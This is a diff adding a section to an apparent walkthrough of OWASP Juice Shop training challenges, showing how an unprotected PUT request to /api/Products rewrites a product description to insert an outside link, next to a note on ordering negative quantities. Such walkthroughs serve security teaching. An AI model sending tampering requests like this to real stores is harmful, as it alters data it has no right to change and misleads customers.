@@ -332,6 +332,21 @@ Content-Type: application/json
 
 Change the quantity to a negative number and finish the order.
 
+## Product Tampering (Broken Access Control)
+_Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description into https://owasp.slack.com._
+
+We know there's `/api/Products` endpoint. Looking into `/main-es2015.js` or just simply guessing we can discover it also
+accepts `PUT` requests.
+
+Let's use it to modify the existing product (id is `9`). Do not forget to add `Content-Type: application/json` header!
+
+```
+PUT /api/Products/9
+Content-Type: application/json
+
+{"description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"}
+```
+
 ## Upload Size (Improper Input Validation)
 _Upload a file larger than 100 kB._
 
